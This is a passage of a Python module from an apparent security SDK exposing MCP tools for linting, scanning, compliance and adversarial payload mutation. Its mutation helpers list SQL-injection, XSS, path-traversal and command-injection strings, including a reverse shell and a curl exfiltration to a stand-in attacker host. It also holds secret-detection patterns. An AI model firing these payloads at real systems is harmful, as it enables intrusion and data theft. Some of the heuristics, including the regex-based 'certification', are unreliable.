"""MCP Server integration module — LLM tool gateway.

Exposes eight security-focused tools through the Model Context Protocol
(MCP).  Each tool can be invoked individually via :meth:`call_tool` or
through convenience wrappers such as :meth:`validate`, :meth:`scan`,
and :meth:`explain`.

The module operates in two modes:

1. **Online** (default) — when an ``mcp_endpoint`` is configured,
   requests are forwarded to a remote MCP server over HTTP/S.
2. **Offline** — all eight tools are emulated locally using built-in
   heuristics and rule-based engines.  No network calls are made.

Supported tools:

* ``validate_code`` — static code validation
* ``scan_target`` — security scanning
* ``explain_finding`` — natural-language finding explanations
* ``generate_test`` — automated test generation
* ``audit_privacy`` — privacy impact auditing
* ``check_compliance`` — regulatory compliance checking
* ``mutate_payload`` — adversarial payload mutation
* ``certify_security`` — security certification

Example::

    >>> from veriforge_sdk.mcp import MCPModule
    >>> mcp = MCPModule(config, logger)
    >>> tools = mcp.list_tools()
    >>> print(len(tools))
    8
    >>> result = mcp.call_tool("validate_code", {"language": "python", "source": "x = 1"})
    >>> print(result["status"])
    ok
"""

from __future__ import annotations

import hashlib
import json
import random
import re
import time
import uuid
from logging import Logger
from typing import TYPE_CHECKING, Any, Callable, Optional

import urllib.error
import urllib.request

from ..exceptions import ConfigurationError, ValidationError

if TYPE_CHECKING:
    from ..config import SDKConfig


# ── Tool schemas ────────────────────────────────────────────────────

_TOOL_SCHEMAS: list[dict[str, Any]] = [
    {
        "name": "validate_code",
        "description": (
            "Validate source code for syntax errors, style violations, "
            "common anti-patterns, and type-safety issues. "
            "Supports Python, JavaScript, TypeScript, Java, Go, Rust, and C++."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "language": {
                    "type": "string",
                    "enum": ["python", "javascript", "typescript", "java", "go", "rust", "cpp"],
                    "description": "Programming language of the source code.",
                },
                "source": {
                    "type": "string",
                    "description": "Source code to validate.",
                },
                "strict": {
                    "type": "boolean",
                    "default": False,
                    "description": "When true, fail on style warnings as well as errors.",
                },
            },
            "required": ["language", "source"],
        },
    },
    {
        "name": "scan_target",
        "description": (
            "Perform a security scan on a file, directory, or URL. "
            "Detects secrets, injection vulnerabilities, misconfigurations, "
            "and known CVE patterns."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "File path, directory path, or URL to scan.",
                },
                "depth": {
                    "type": "integer",
                    "default": 1,
                    "minimum": 0,
                    "maximum": 5,
                    "description": "Recursion depth for directory scans.",
                },
                "rules": {
                    "type": "array",
                    "items": {"type": "string"},
                    "default": [],
                    "description": "Optional rule IDs to include. Empty = all rules.",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "explain_finding",
        "description": (
            "Generate a human-readable explanation of a security finding. "
            "Includes root cause, potential impact, and remediation guidance."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "finding": {
                    "type": "object",
                    "description": "Security finding dictionary from a previous scan.",
                },
                "detail_level": {
                    "type": "string",
                    "enum": ["brief", "standard", "detailed"],
                    "default": "standard",
                    "description": "Verbosity of the explanation.",
                },
            },
            "required": ["finding"],
        },
    },
    {
        "name": "generate_test",
        "description": (
            "Generate unit or integration tests for a given function or class. "
            "Supports property-based, boundary-value, and fuzzing strategies."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "language": {
                    "type": "string",
                    "enum": ["python", "javascript", "typescript", "java", "go", "rust", "cpp"],
                    "description": "Programming language.",
                },
                "signature": {
                    "type": "string",
                    "description": "Function or method signature to generate tests for.",
                },
                "strategy": {
                    "type": "string",
                    "enum": ["property", "boundary", "fuzz", "mixed"],
                    "default": "mixed",
                    "description": "Test generation strategy.",
                },
                "count": {
                    "type": "integer",
                    "default": 5,
                    "minimum": 1,
                    "maximum": 50,
                    "description": "Number of test cases to generate.",
                },
            },
            "required": ["language", "signature"],
        },
    },
    {
        "name": "audit_privacy",
        "description": (
            "Audit code or configuration for privacy compliance (GDPR, CCPA). "
            "Identifies PII collection points, data retention issues, and "
            "missing consent mechanisms."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "File path, directory, or source snippet to audit.",
                },
                "regulations": {
                    "type": "array",
                    "items": {"type": "string", "enum": ["GDPR", "CCPA", "HIPAA", "PCI-DSS"]},
                    "default": ["GDPR", "CCPA"],
                    "description": "Regulatory frameworks to check against.",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "check_compliance",
        "description": (
            "Check code and configuration against security compliance standards "
            "such as OWASP Top 10, NIST CSF, ISO 27001, and SOC 2."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "File path, directory, or source snippet.",
                },
                "standards": {
                    "type": "array",
                    "items": {
                        "type": "string",
                        "enum": ["OWASP_TOP10", "NIST_CSF", "ISO27001", "SOC2"],
                    },
                    "default": ["OWASP_TOP10"],
                    "description": "Compliance standards to evaluate.",
                },
            },
            "required": ["target"],
        },
    },
    {
        "name": "mutate_payload",
        "description": (
            "Generate adversarial payload mutations for security testing. "
            "Supports SQL injection, XSS, command injection, path traversal, "
            "and format-string attack vectors."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "payload": {
                    "type": "string",
                    "description": "Base payload string to mutate.",
                },
                "vector": {
                    "type": "string",
                    "enum": ["sql_injection", "xss", "command_injection", "path_traversal", "format_string"],
                    "description": "Attack vector category.",
                },
                "mutations": {
                    "type": "integer",
                    "default": 5,
                    "minimum": 1,
                    "maximum": 20,
                    "description": "Number of mutations to produce.",
                },
            },
            "required": ["payload", "vector"],
        },
    },
    {
        "name": "certify_security",
        "description": (
            "Produce a formal security certification for a target. "
            "Evaluates all available signals and emits a signed certificate "
            "with grade, findings summary, and recommendations."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "File path, directory, or artifact to certify.",
                },
                "level": {
                    "type": "string",
                    "enum": ["basic", "standard", "comprehensive"],
                    "default": "standard",
                    "description": "Certification depth level.",
                },
            },
            "required": ["target"],
        },
    },
]

# Build lookup tables
_TOOL_MAP: dict[str, dict[str, Any]] = {t["name"]: t for t in _TOOL_SCHEMAS}
_TOOL_NAMES: list[str] = [t["name"] for t in _TOOL_SCHEMAS]


# ── Offline tool implementations ────────────────────────────────────


def _offline_validate_code(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``validate_code``.

    Performs basic syntax checking and heuristic anti-pattern detection
    for supported languages.
    """
    language = params.get("language", "")
    source = params.get("source", "")
    strict = params.get("strict", False)

    issues: list[dict[str, Any]] = []
    line_count = source.count("\n") + 1

    # Check for empty source
    if not source.strip():
        issues.append({
            "severity": "error",
            "line": 0,
            "message": "Source code is empty.",
            "rule": "empty-source",
        })
        return {"status": "error", "issues": issues, "score": 0.0}

    # Language-specific heuristics
    if language == "python":
        issues.extend(_lint_python(source, strict))
    elif language in ("javascript", "typescript"):
        issues.extend(_lint_javascript(source, strict))
    elif language == "java":
        issues.extend(_lint_java(source, strict))
    elif language == "go":
        issues.extend(_lint_go(source, strict))
    elif language == "rust":
        issues.extend(_lint_rust(source, strict))
    elif language == "cpp":
        issues.extend(_lint_cpp(source, strict))

    # Generic checks (all languages)
    issues.extend(_lint_generic(source, strict))

    errors = sum(1 for i in issues if i["severity"] == "error")
    warnings = sum(1 for i in issues if i["severity"] == "warning")

    if errors > 0:
        status = "error"
    elif warnings > 0 and strict:
        status = "error"
    elif warnings > 0:
        status = "warning"
    else:
        status = "ok"

    score = max(0.0, 1.0 - (errors * 0.25) - (warnings * 0.05))

    return {
        "status": status,
        "language": language,
        "lines": line_count,
        "errors": errors,
        "warnings": warnings,
        "score": round(score, 2),
        "issues": issues,
    }


def _offline_scan_target(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``scan_target``."""
    target = params.get("target", "")
    depth = params.get("depth", 1)
    rules = params.get("rules", [])

    findings: list[dict[str, Any]] = []
    files_scanned = 0

    # Scan a single file or simulate directory scan
    if target:
        files_scanned = 1
        content = target if len(target) > 100 else ""
        findings.extend(_heuristic_secret_scan(content))
        findings.extend(_heuristic_vuln_scan(content, rules))
    else:
        findings.append({
            "severity": "warning",
            "category": "configuration",
            "title": "Empty scan target",
            "description": "No target was provided for scanning.",
        })

    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        severity_counts[f.get("severity", "info")] = severity_counts.get(f.get("severity", "info"), 0) + 1

    risk_score = min(10.0, severity_counts["critical"] * 3.0 + severity_counts["high"] * 2.0 + severity_counts["medium"] * 0.5)

    grade = "A+"
    if risk_score > 8:
        grade = "F"
    elif risk_score > 6:
        grade = "D"
    elif risk_score > 4:
        grade = "C"
    elif risk_score > 2:
        grade = "B"

    return {
        "target": target,
        "files_scanned": files_scanned,
        "depth": depth,
        "findings": findings,
        "severity_counts": severity_counts,
        "risk_score": round(risk_score, 1),
        "grade": grade,
        "status": "complete",
    }


def _offline_explain_finding(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``explain_finding``."""
    finding = params.get("finding", {})
    detail_level = params.get("detail_level", "standard")

    title = finding.get("title", "Unknown finding")
    description = finding.get("description", "")
    severity = finding.get("severity", "info")
    category = finding.get("category", "general")
    cwe_id = finding.get("cwe_id", "")
    remediation = finding.get("remediation", "")

    explanation_parts = [f"## {title}", f"**Severity:** {severity.upper()}"]

    if detail_level in ("standard", "detailed"):
        explanation_parts.extend([
            f"**Category:** {category}",
            "",
            f"### Description",
            description or "No detailed description available.",
        ])

    if detail_level == "detailed":
        explanation_parts.extend([
            "",
            f"### Root Cause Analysis",
            f"This {category} issue typically occurs when input validation is "
            f"insufficient or missing. Attackers may exploit this weakness to "
            f"compromise confidentiality, integrity, or availability.",
        ])
        if cwe_id:
            explanation_parts.extend([
                "",
                f"### CWE Reference",
                f"[CWE-{cwe_id}](https://cwe.mitre.org/data/definitions/{cwe_id}.html)",
            ])

    explanation_parts.extend([
        "",
        "### Remediation",
        remediation or "Review the affected code and apply secure coding practices.",
    ])

    return {
        "explanation": "\n".join(explanation_parts),
        "title": title,
        "severity": severity,
        "detail_level": detail_level,
    }


def _offline_generate_test(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``generate_test``."""
    language = params.get("language", "python")
    signature = params.get("signature", "")
    strategy = params.get("strategy", "mixed")
    count = min(params.get("count", 5), 50)

    # Parse function name from signature
    func_match = re.search(r"(?:def|fn|func|function)\s+(\w+)", signature)
    if not func_match:
        func_match = re.search(r"(\w+)\s*\(", signature)
    func_name = func_match.group(1) if func_match else "function_under_test"

    # Parse parameters
    params_match = re.search(r"\((.*?)\)", signature)
    param_names: list[str] = []
    if params_match:
        raw = params_match.group(1)
        for part in raw.split(","):
            part = part.strip()
            if part:
                # Extract parameter name (before type annotation if present)
                name = part.split(":")[0].split("=")[0].strip()
                if name and name not in ("self", "cls"):
                    param_names.append(name)

    tests: list[dict[str, Any]] = []
    for i in range(count):
        test_inputs: dict[str, Any] = {}
        for pname in param_names:
            if strategy == "boundary":
                test_inputs[pname] = random.choice([0, 1, -1, 999999, "", None])
            elif strategy == "fuzz":
                test_inputs[pname] = _fuzz_value()
            elif strategy == "property":
                test_inputs[pname] = i + 1  # deterministic increasing values
            else:  # mixed
                test_inputs[pname] = random.choice([i, i + 1, -i, f"test_{i}", None])

        tests.append({
            "name": f"test_{func_name}_case_{i + 1}",
            "function": func_name,
            "inputs": test_inputs,
            "expected": "valid" if i % 3 != 0 else "check_manually",
            "strategy": strategy,
        })

    return {
        "function": func_name,
        "language": language,
        "strategy": strategy,
        "tests_generated": len(tests),
        "tests": tests,
    }


def _offline_audit_privacy(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``audit_privacy``."""
    target = params.get("target", "")
    regulations = params.get("regulations", ["GDPR", "CCPA"])

    issues: list[dict[str, Any]] = []

    # Heuristic PII detection patterns
    pii_patterns = [
        (r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "email_address"),
        (r"\b\d{3}-\d{2}-\d{4}\b", "ssn"),
        (r"\b\d{16}\b", "credit_card_number"),
        (r"\b(?:password|passwd|pwd)\s*[=:]\s*['\"]", "hardcoded_password"),
        (r"\bphone\b|\btel\b|\bmobile\b", "phone_number_field"),
        (r"\baddress\b|\bstreet\b|\bzipcode\b", "address_field"),
        (r"\bcookie\b|\blocalStorage\b|\bsessionStorage\b", "client_storage"),
        (r"\btrack\b|\banalytics\b|\btelemetry\b", "tracking_mechanism"),
    ]

    for pattern, pii_type in pii_patterns:
        if re.search(pattern, target, re.IGNORECASE):
            issues.append({
                "type": pii_type,
                "regulations": [r for r in regulations if r in ("GDPR", "CCPA", "HIPAA", "PCI-DSS")],
                "severity": "high" if pii_type in ("ssn", "credit_card_number", "hardcoded_password") else "medium",
                "recommendation": f"Review handling of {pii_type}. Ensure consent, minimisation, and encryption.",
            })

    return {
        "target": target[:200],
        "regulations_checked": regulations,
        "pii_issues_found": len(issues),
        "issues": issues,
        "compliant": len(issues) == 0,
        "recommendations": (
            ["No PII issues detected. Maintain current practices."]
            if len(issues) == 0
            else list({i["recommendation"] for i in issues})
        ),
    }


def _offline_check_compliance(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``check_compliance``."""
    target = params.get("target", "")
    standards = params.get("standards", ["OWASP_TOP10"])

    findings: list[dict[str, Any]] = []

    # OWASP Top 10 heuristic patterns
    owasp_patterns = {
        "A01:2021-Broken Access Control": r"(bypass|unauthorized|permission|role)\s*(check|verify|validate)?",
        "A02:2021-Cryptographic Failures": r"(md5|sha1|des|rc4|ecb|hardcoded)\s*(key|password|secret|token)?",
        "A03:2021-Injection": r"(execute|query|exec)\s*\(.*\+.*\)|(\$\{|%s|%d).*sql|SELECT.*FROM.*\+",
        "A05:2021-Security Misconfiguration": r"(debug\s*=\s*True|DEBUG|admin|default|password\s*=\s*[\"'][^\"']*[\"'])",
        "A07:2021-Auth Failures": r"(jwt|session|token|auth)\s*(none|bypass|null|empty)?",
    }

    if "OWASP_TOP10" in standards:
        for owasp_id, pattern in owasp_patterns.items():
            if re.search(pattern, target, re.IGNORECASE):
                findings.append({
                    "standard": "OWASP_TOP10",
                    "control_id": owasp_id,
                    "status": "violation",
                    "severity": "high",
                    "evidence": f"Pattern matched: {pattern[:60]}...",
                })

    # NIST CSF heuristic patterns
    nist_patterns = {
        "PR.AC": r"(auth|access|permission|role|identity)",
        "PR.DS": r"(encrypt|cipher|hash|salt|tokenize)",
        "PR.IP": r"(update|patch|version|cve|security)",
        "DE.CM": r"(monitor|alert|log|audit|detect)",
    }

    if "NIST_CSF" in standards:
        for nist_id, pattern in nist_patterns.items():
            if not re.search(pattern, target, re.IGNORECASE):
                findings.append({
                    "standard": "NIST_CSF",
                    "control_id": nist_id,
                    "status": "missing",
                    "severity": "medium",
                    "evidence": f"No evidence of {nist_id} controls found.",
                })

    compliance_score = max(0.0, 1.0 - len(findings) * 0.1)

    return {
        "target": target[:200],
        "standards_evaluated": standards,
        "findings": findings,
        "total_findings": len(findings),
        "compliance_score": round(compliance_score, 2),
        "compliant": compliance_score >= 0.8,
    }


def _offline_mutate_payload(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``mutate_payload``."""
    payload = params.get("payload", "")
    vector = params.get("vector", "sql_injection")
    mutations = min(params.get("mutations", 5), 20)

    mutators: dict[str, Callable[[str], list[str]]] = {
        "sql_injection": _mutate_sql,
        "xss": _mutate_xss,
        "command_injection": _mutate_command,
        "path_traversal": _mutate_path,
        "format_string": _mutate_format_string,
    }

    mutator = mutators.get(vector, _mutate_sql)
    pool = mutator(payload)

    # Ensure deterministic output size
    while len(pool) < mutations:
        pool.append(pool[len(pool) % len(pool)] if pool else payload + "_mutated")

    return {
        "original": payload,
        "vector": vector,
        "mutations": pool[:mutations],
        "count": min(mutations, len(pool)),
    }


def _offline_certify_security(params: dict[str, Any]) -> dict[str, Any]:
    """Offline implementation of ``certify_security``."""
    target = params.get("target", "")
    level = params.get("level", "standard")

    target_hash = hashlib.sha256(target.encode()).hexdigest()[:16]
    cert_id = f"VF-CERT-{target_hash}-{uuid.uuid4().hex[:8]}"
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    # Simulate grade based on target content
    risk_indicators = sum(1 for p in [r"password", r"secret", r"eval\(", r"exec\(", r"SELECT.*\*"]
                         if re.search(p, target, re.IGNORECASE))

    if risk_indicators == 0:
        grade = "A"
    elif risk_indicators <= 2:
        grade = "B"
    elif risk_indicators <= 4:
        grade = "C"
    else:
        grade = "D"

    checks = {
        "basic": ["syntax_check", "secret_scan"],
        "standard": ["syntax_check", "secret_scan", "vuln_scan", "compliance_check"],
        "comprehensive": [
            "syntax_check", "secret_scan", "vuln_scan",
            "compliance_check", "privacy_audit", "mutation_test",
        ],
    }

    return {
        "certificate_id": cert_id,
        "target": target[:200],
        "grade": grade,
        "level": level,
        "timestamp": timestamp,
        "checks_performed": checks.get(level, checks["standard"]),
        "risk_indicators": risk_indicators,
        "recommendations": (
            ["Implement secure coding training.", "Enable automated security scanning in CI/CD."]
            if grade > "B" else ["Maintain current security posture."]
        ),
        "expiry": "90 days",
        "status": "issued",
    }


# ── Offline dispatch table ──────────────────────────────────────────

_OFFLINE_HANDLERS: dict[str, Callable[[dict[str, Any]], dict[str, Any]]] = {
    "validate_code": _offline_validate_code,
    "scan_target": _offline_scan_target,
    "explain_finding": _offline_explain_finding,
    "generate_test": _offline_generate_test,
    "audit_privacy": _offline_audit_privacy,
    "check_compliance": _offline_check_compliance,
    "mutate_payload": _offline_mutate_payload,
    "certify_security": _offline_certify_security,
}


# ── Lint helpers ────────────────────────────────────────────────────


def _lint_python(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run Python-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        # Check for eval() usage
        if re.search(r"\beval\s*\(", stripped):
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "Use of eval() is dangerous and should be avoided.",
                "rule": "B307-eval",
            })

        # Check for exec() usage
        if re.search(r"\bexec\s*\(", stripped):
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "Use of exec() is dangerous and should be avoided.",
                "rule": "B102-exec",
            })

        # Check for hardcoded secrets
        if re.search(r"(password|secret|token|api_key)\s*=\s*['\"][^'\"]+['\"]", stripped, re.IGNORECASE):
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "Possible hardcoded secret detected.",
                "rule": "G101-hardcoded-secret",
            })

        # Check for shell=True
        if "shell=True" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "subprocess with shell=True is a security risk.",
                "rule": "B605-shell-true",
            })

        # Check for bare except
        if re.search(r"\bbexcept\b\s*:", stripped):
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "Bare 'except:' clause catches SystemExit and KeyboardInterrupt.",
                "rule": "E722-bare-except",
            })

        # Check for assert statements (removed in optimised mode)
        if strict and re.search(r"\bassert\s+\w", stripped):
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "assert statements are removed when Python runs with -O.",
                "rule": "S101-assert",
            })

        # Check for debug mode
        if re.search(r"debug\s*=\s*True", stripped, re.IGNORECASE):
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "Debug mode enabled. Should be False in production.",
                "rule": "W201-debug-true",
            })

    return issues


def _lint_javascript(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run JavaScript/TypeScript-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        if "eval(" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "Use of eval() is dangerous.",
                "rule": "JS-DANGEROUS-EVAL",
            })

        if "innerHTML" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "innerHTML can lead to XSS vulnerabilities. Use textContent or sanitise.",
                "rule": "JS-XSS-INNERHTML",
            })

        if "document.write(" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "document.write is discouraged and can be an XSS vector.",
                "rule": "JS-DOCUMENT-WRITE",
            })

        if re.search(r"setTimeout\s*\(\s*['\"]", stripped):
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "setTimeout with string argument is equivalent to eval().",
                "rule": "JS-SETTIMEOUT-EVAL",
            })

    return issues


def _lint_java(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run Java-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        if "Runtime.getRuntime().exec(" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "Command execution can lead to command injection.",
                "rule": "JAVA-COMMAND-INJECTION",
            })

        if "ObjectInputStream" in stripped and "readObject" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "Deserialization of untrusted data (CVE-2017-7525).",
                "rule": "JAVA-INSECURE-DESERIALIZATION",
            })

    return issues


def _lint_go(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run Go-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        if "exec.Command(" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "Command execution. Validate all arguments.",
                "rule": "GO-OS-EXEC",
            })

        if "unsafe" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "Use of unsafe package bypasses Go's memory safety.",
                "rule": "GO-UNSAFE",
            })

    return issues


def _lint_rust(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run Rust-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        if "unsafe" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "unsafe block bypasses Rust's borrow checker. Document and justify.",
                "rule": "RUST-UNSAFE",
            })

        if "mem::transmute" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "mem::transmute is extremely dangerous and should be avoided.",
                "rule": "RUST-TRANSFORM",
            })

    return issues


def _lint_cpp(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run C++-specific lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()

    for lineno, line in enumerate(lines, 1):
        stripped = line.strip()

        if "strcpy(" in stripped or "strcat(" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "strcpy/strcat are unsafe. Use strncpy/strncat or std::string.",
                "rule": "CPP-UNSAFE-STRING",
            })

        if "gets(" in stripped:
            issues.append({
                "severity": "error",
                "line": lineno,
                "message": "gets() is removed in C11. Use fgets() instead.",
                "rule": "CPP-GETS",
            })

        if "system(" in stripped:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "system() can lead to command injection.",
                "rule": "CPP-SYSTEM",
            })

    return issues


def _lint_generic(source: str, strict: bool) -> list[dict[str, Any]]:
    """Run language-agnostic lint checks."""
    issues: list[dict[str, Any]] = []
    lines = source.splitlines()
    max_line_length = 120

    for lineno, line in enumerate(lines, 1):
        if strict and len(line) > max_line_length:
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": f"Line exceeds {max_line_length} characters.",
                "rule": "GENERIC-LINE-LENGTH",
            })

        # TODO markers
        if "TODO" in line and re.search(r"TODO\s*:\s*(security|fix|hack)", line, re.IGNORECASE):
            issues.append({
                "severity": "warning",
                "line": lineno,
                "message": "TODO marker related to security. Address before release.",
                "rule": "GENERIC-SECURITY-TODO",
            })

        # Commented-out code (common mistake)
        if re.search(r"^\s*//\s*(if|for|while|def|function|class)\b", line):
            issues.append({
                "severity": "info",
                "line": lineno,
                "message": "Commented-out code detected. Remove before committing.",
                "rule": "GENERIC-COMMENTED-CODE",
            })

    return issues


# ── Heuristic scanners ──────────────────────────────────────────────


def _heuristic_secret_scan(content: str) -> list[dict[str, Any]]:
    """Scan *content* for potential secrets using heuristics."""
    findings: list[dict[str, Any]] = []

    secret_patterns = [
        (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"][a-zA-Z0-9]{16,}['\"]", "api_key", "high"),
        (r"(?i)(aws[_-]?secret[_-]?access[_-]?key)\s*[:=]\s*['\"][a-zA-Z0-9/+=]{40}['\"]", "aws_secret", "critical"),
        (r"(?i)(private[_-]?key|privkey)\s*[:=]\s*['\"]-----BEGIN", "private_key", "critical"),
        (r"gh[pousr]_[A-Za-z0-9_]{36,}", "github_token", "high"),
        (r"glpat-[A-Za-z0-9\-]{20,}", "gitlab_token", "high"),
        (r"AKIA[0-9A-Z]{16}", "aws_access_key_id", "high"),
    ]

    for pattern, secret_type, severity in secret_patterns:
        if re.search(pattern, content):
            findings.append({
                "severity": severity,
                "category": "secret",
                "title": f"Possible {secret_type} detected",
                "description": f"A string matching the {secret_type} pattern was found in the scanned content.",
            })

    return findings


def _heuristic_vuln_scan(content: str, rules: list[str]) -> list[dict[str, Any]]:
    """Scan *content* for common vulnerability patterns."""
    findings: list[dict[str, Any]] = []

    vuln_patterns = [
        (r"(?i)(SELECT|INSERT|UPDATE|DELETE)\s+.*\+.*\+|\$\{.*\}.*sql", "sql_injection", "critical"),
        (r"(?i)<script[^>]*>.*?</script>|javascript:", "xss", "high"),
        (r"(?i)eval\s*\(|new\s+Function\s*\(|setTimeout\s*\(\s*['\"]", "code_injection", "critical"),
        (r"(?i)\.\./|\.\.\\|%2e%2e%2f", "path_traversal", "high"),
        (r"(?i)printf\s*\(.*%s|%n|%d.*\)", "format_string", "medium"),
        (r"(?i)pickle\.(loads|load)\s*\(", "insecure_deserialization", "high"),
        (r"(?i)yaml\.(load|unsafe_load)\s*\(", "yaml_deserialization", "high"),
    ]

    for pattern, vuln_type, severity in vuln_patterns:
        if re.search(pattern, content):
            findings.append({
                "severity": severity,
                "category": vuln_type,
                "title": f"Potential {vuln_type} vulnerability",
                "description": f"Pattern indicative of {vuln_type} was detected in the content.",
            })

    return findings


# ── Mutation helpers ────────────────────────────────────────────────


def _mutate_sql(payload: str) -> list[str]:
    """Generate SQL-injection mutations of *payload*."""
    return [
        payload + "' OR '1'='1",
        payload + "' OR 1=1--",
        payload + "'; DROP TABLE users; --",
        payload + "' UNION SELECT * FROM users--",
        payload + "' AND 1=0 UNION SELECT null, version()--",
        payload + "' OR '1'='1' /*",
        payload + "\\' OR \\'1\\'=\\'1",
        payload + "%27%20OR%20%271%27%3D%271",
    ]


def _mutate_xss(payload: str) -> list[str]:
    """Generate XSS mutations of *payload*."""
    return [
        payload + "<script>alert(1)</script>",
        payload + "<img src=x onerror=alert(1)>",
        payload + "javascript:alert(1)",
        payload + "<svg onload=alert(1)>",
        payload + "<body onload=alert(1)>",
        "<scr ipt>alert(1)</scr ipt>",
        "<script>alert&#40;1&#41;</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
    ]


def _mutate_command(payload: str) -> list[str]:
    """Generate command-injection mutations of *payload*."""
    return [
        payload + "; cat /etc/passwd",
        payload + "| whoami",
        payload + "`id`",
        payload + "$(uname -a)",
        payload + "; nc -e /bin/sh attacker.com 4444",
        payload + "&& powershell.exe -Command whoami",
        payload + "\n/bin/sh\n",
        payload + "; curl http://attacker.com/exfil?data=$(cat /etc/passwd)",
    ]


def _mutate_path(payload: str) -> list[str]:
    """Generate path-traversal mutations of *payload*."""
    return [
        payload + "../../../etc/passwd",
        payload + "....//....//....//etc/passwd",
        payload + "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        payload + "..\\..\\..\\windows\\system32\\config\\sam",
        payload + "/etc/passwd%00.jpg",
        payload + "../../../etc/passwd%00",
        payload + "....\\....\\....\\boot.ini",
        "\\x2e\x2e\x2f\x2e\x2e\x2fetc/passwd",
    ]


def _mutate_format_string(payload: str) -> list[str]:
    """Generate format-string mutations of *payload*."""
    return [
        payload + "%s%s%s%s",
        payload + "%x %x %x %x",
        payload + "%n",
        payload + "%p %p %p %p",
        payload + "%d%d%d%d",
        payload + "%08x.%08x.%08x.%08x",
        payload + "%%20n",
        payload + "%s" * 50,
    ]


def _fuzz_value() -> Any:
    """Return a random fuzzing value."""
    return random.choice([
        "", "A" * 1000, "\x00", "\xff" * 100, "-1", "0",
        "99999999999999999999", "[]", "{}", "null", "undefined",
        "<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd",
    ])


# ── MCPModule ───────────────────────────────────────────────────────


class MCPModule:
    """MCP Server integration — gateway to 8 security tools.

    Provides a unified interface to invoke tools either locally (offline
    mode) or by forwarding requests to a remote MCP server (online mode).

    Args:
        config: SDK configuration instance.
        logger: Logger for diagnostic output.

    Example::

        >>> mcp = MCPModule(config, logger)
        >>> tools = mcp.list_tools()
        >>> result = mcp.validate("python", "x = 1 + 2")
        >>> explanation = mcp.explain({"title": "SQL Injection", "severity": "critical"})
    """

    CAPABILITIES: list[str] = [
        "code_validation",
        "security_scanning",
        "finding_explanation",
        "test_generation",
        "privacy_auditing",
        "compliance_checking",
        "payload_mutation",
        "security_certification",
        "mcp_tool_protocol",
    ]

    # All 8 tool names exposed by this module
    TOOL_NAMES: list[str] = _TOOL_NAMES

    def __init__(self, config: "SDKConfig", logger: Logger) -> None:
        """Initialise the MCP module.

        Args:
            config: SDK configuration instance.
            logger: Logger for diagnostic output.
        """
        self.config = config
        self.logger = logger
        self._endpoint: Optional[str] = getattr(config, "mcp_endpoint", None)
        self._timeout_ms: int = getattr(config, "timeout_ms", 30000)

        mode = "online" if self._endpoint else "offline"
        self.logger.info("MCPModule initialised — mode=%s tools=%d", mode, len(_TOOL_SCHEMAS))

